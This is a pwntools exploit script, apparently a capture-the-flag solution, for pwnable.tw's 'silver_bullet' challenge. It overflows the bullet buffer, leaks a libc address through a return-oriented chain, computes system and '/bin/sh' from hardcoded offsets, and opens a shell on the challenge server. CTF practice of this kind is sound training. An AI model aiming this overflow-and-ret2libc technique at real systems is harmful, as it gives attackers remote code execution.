from pwn import *

#r = process(['/glibc/2.23/32/lib/ld-2.23.so','./silver_bullet'],env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10103)

def create():
    r.recvuntil('choice :')
    r.sendline('1')
    r.recvuntil('bullet :')
    r.sendline('a'*47)

def power(p):
    r.recvuntil('choice :')
    r.sendline('2')
    r.recvuntil('bullet :')
    r.sendline(p)

def beat():
    r.recvuntil('choice :')
    r.sendline('3')

def main():
    #first loop to leak the libc address
    create()
    power('b')
    power('b'*7+p32(0x80484a8)+p32(0x08048954)+p32(0x804afd0))
    beat()
    beat()
    r.recvuntil('Oh ! You win !!\n')
    leak = u32(r.recvuntil('\n').strip('\n')[:4])
    libc_base_offset = 0xd41c0
    libc_system_offset = 0x0003a940
    libc_base = leak - libc_base_offset
    libc_system = libc_base + libc_system_offset
    libc_binsh_offset = 0x00158e8b
    libc_binsh = libc_base + libc_binsh_offset
    #second loop to return to libc
    create()
    power('b')
    power('b'*7+p32(libc_system)+p32(libc_system)+p32(libc_binsh))
    beat()
    beat()

if __name__ == '__main__':
    main()
    r.interactive()
